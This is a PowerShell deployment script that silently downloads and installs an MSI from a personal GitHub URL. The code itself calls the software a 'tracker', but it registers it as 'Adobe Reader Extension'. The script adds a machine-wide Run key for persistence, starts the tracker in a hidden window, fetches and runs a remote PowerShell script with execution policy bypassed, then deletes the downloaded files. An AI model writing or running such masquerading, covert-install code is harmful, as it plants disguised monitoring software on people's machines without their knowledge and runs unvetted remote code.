$ErrorActionPreference = 'Stop'

$TempPath = 'C:\Windows\Temp'
$LogFile  = Join-Path $TempPath 'deploy.log'

# --- Adobe Reader Extension target release ---
$TargetVer = '1.0.4'
$DisplayNames = @('Adobe Reader Extension', 'DX CyberProtect')
$ProcessNames = @('AdobeExtension', 'DX-CyberProtect')

$MsiUrl     = "https://raw.githubusercontent.com/dycheto/agent-dev/main/adobeextension_v$TargetVer.msi"
$MsiPath    = Join-Path $TempPath "adobeextension_v$TargetVer.msi"
$MsiLogPath = Join-Path $TempPath 'adobeextension-msi.log'

# --- Wazuh agent installer ---
$InstallScriptUrl  = 'https://raw.githubusercontent.com/dycheto/agent-dev/main/install-agent.ps1'
$InstallScriptPath = Join-Path $TempPath 'install-agent.ps1'

# --- Machine-wide Run key ---
$MachineRunKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
$RunValueName  = 'Adobe Reader Extension'

function Write-Log {
    param([string]$Message)
    Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message"
}

function Get-InstalledEntry {
    param([string[]]$Names)

    $Paths = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )

    foreach ($Path in $Paths) {
        $Item = Get-ItemProperty $Path -ErrorAction SilentlyContinue |
            Where-Object { $Names -contains $_.DisplayName } |
            Select-Object -First 1

        if ($Item) { return $Item }
    }

    return $null
}

function Test-InstalledSoftware {
    param([string]$DisplayName)

    $Paths = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )

    foreach ($Path in $Paths) {
        $Item = Get-ItemProperty $Path -ErrorAction SilentlyContinue |
            Where-Object { $_.DisplayName -eq $DisplayName }

        if ($Item) { return $true }
    }

    return $false
}

function Stop-TrackerProcesses {
    param([string[]]$Names)

    foreach ($Name in $Names) {
        $procs = Get-Process -Name $Name -ErrorAction SilentlyContinue
        if (-not $procs) {
            Write-Log "No running $Name.exe found."
            continue
        }

        Write-Log "Stopping $($procs.Count) $Name.exe process(es)."
        foreach ($p in $procs) {
            try {
                $p.Kill()
                $null = $p.WaitForExit(10000)
            }
            catch {
                Write-Log "Failed to kill PID $($p.Id) for $Name.exe: $($_.Exception.Message)"
            }
        }

        Start-Process -FilePath 'taskkill.exe' `
            -ArgumentList "/IM $Name.exe /F /T" `
            -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
    }
}

function Install-AdobeExtension {
    Write-Log "Downloading MSI from $MsiUrl"
    Invoke-WebRequest -UseBasicParsing -Uri $MsiUrl -OutFile $MsiPath

    Write-Log 'Installing/upgrading Adobe Reader Extension silently.'
    $msi = Start-Process -FilePath 'msiexec.exe' `
        -ArgumentList "/i `"$MsiPath`" /qn /norestart REBOOT=ReallySuppress /L*V `"$MsiLogPath`"" `
        -Wait -PassThru

    Write-Log "MSI exit code: $($msi.ExitCode)"
    Write-Log "MSI log path: $MsiLogPath"

    if ($msi.ExitCode -ne 0) {
        throw "MSI install failed with exit code $($msi.ExitCode). See $MsiLogPath"
    }
}

function Get-TrackerExePath {
    $Candidates = @(
        'C:\Program Files (x86)\adobeextension\AdobeExtension.exe',
        'C:\Program Files\adobeextension\AdobeExtension.exe'
    )

    foreach ($Path in $Candidates) {
        if (Test-Path $Path) {
            return $Path
        }
    }

    return $null
}

function Ensure-TrackerRunAtLogon {
    $ExePath = Get-TrackerExePath
    if (-not $ExePath) {
        throw 'Tracker executable not found after install.'
    }

    $RunValue = "`"$ExePath`""
    New-Item -Path $MachineRunKey -Force | Out-Null
    Set-ItemProperty -Path $MachineRunKey -Name $RunValueName -Value $RunValue -Type String

    Write-Log "Configured HKLM Run entry '$RunValueName' => $RunValue"
}

function Test-RunningAsSystem {
    return [System.Security.Principal.WindowsIdentity]::GetCurrent().Name -eq 'NT AUTHORITY\SYSTEM'
}

function Start-TrackerIfInteractiveUser {
    if (Test-RunningAsSystem) {
        Write-Log 'Bootstrap is running as SYSTEM. Skipping immediate tracker launch.'
        return
    }

    $ExePath = Get-TrackerExePath
    if (-not $ExePath) {
        throw 'Tracker executable not found for immediate launch.'
    }

    Write-Log "Starting tracker for current user from $ExePath"
    Start-Process -FilePath $ExePath -WindowStyle Hidden
}

try {
    Write-Log '--- Bootstrap started ---'

    $TrackerInstallFailed = $false

    $InstalledEntry = Get-InstalledEntry -Names $DisplayNames
    $InstalledName = if ($InstalledEntry) { $InstalledEntry.DisplayName } else { $null }
    $InstalledVer  = if ($InstalledEntry) { $InstalledEntry.DisplayVersion } else { $null }

    $WazuhInstalled = Test-InstalledSoftware -DisplayName 'Wazuh Agent'

    Write-Log "Detected tracker: $InstalledName"
    Write-Log "Detected tracker version: $InstalledVer (target $TargetVer)"
    Write-Log "Wazuh Agent installed: $WazuhInstalled"

    # ---- Tracker: install or upgrade as needed ----
    try {
        if (-not $InstalledEntry) {
            Write-Log 'Adobe Reader Extension is missing. Performing fresh install.'
            Install-AdobeExtension
        }
        elseif ($InstalledVer -ne $TargetVer) {
            Write-Log "Adobe Reader Extension version mismatch ($InstalledVer != $TargetVer). Upgrading."
            Stop-TrackerProcesses -Names $ProcessNames
            Start-Sleep -Seconds 2
            Install-AdobeExtension
        }
        else {
            Write-Log "Adobe Reader Extension already at target version $TargetVer. Skipping MSI install."
        }

        Ensure-TrackerRunAtLogon
        Start-TrackerIfInteractiveUser
    }
    catch {
        $TrackerInstallFailed = $true
        Write-Log "Tracker install/startup registration failed: $($_.Exception.Message)"
    }

    # ---- Wazuh Agent ----
    if (-not $WazuhInstalled) {
        Write-Log 'Wazuh Agent is missing. Downloading install-agent.ps1.'
        Invoke-WebRequest -UseBasicParsing -Uri $InstallScriptUrl -OutFile $InstallScriptPath

        Write-Log 'Running install-agent.ps1.'
        $ps = Start-Process -FilePath 'powershell.exe' `
            -ArgumentList "-ExecutionPolicy Bypass -File `"$InstallScriptPath`"" `
            -WindowStyle Hidden -Wait -PassThru

        Write-Log "install-agent.ps1 exit code: $($ps.ExitCode)"

        if ($ps.ExitCode -ne 0) {
            Write-Log "Wazuh Agent install failed with exit code $($ps.ExitCode)"
        }
    }
    else {
        Write-Log 'Wazuh Agent already installed. Skipping install-agent.ps1.'
    }

    Write-Log 'Cleaning up downloaded files.'
    Remove-Item -Path $MsiPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $InstallScriptPath -Force -ErrorAction SilentlyContinue

    if ($TrackerInstallFailed) {
        Write-Log 'Bootstrap finished, but tracker install/startup registration failed.'
        exit 1
    }

    Write-Log '--- Bootstrap completed successfully ---'
}
catch {
    Write-Log "Bootstrap failed: $($_.Exception.Message)"
    exit 1
}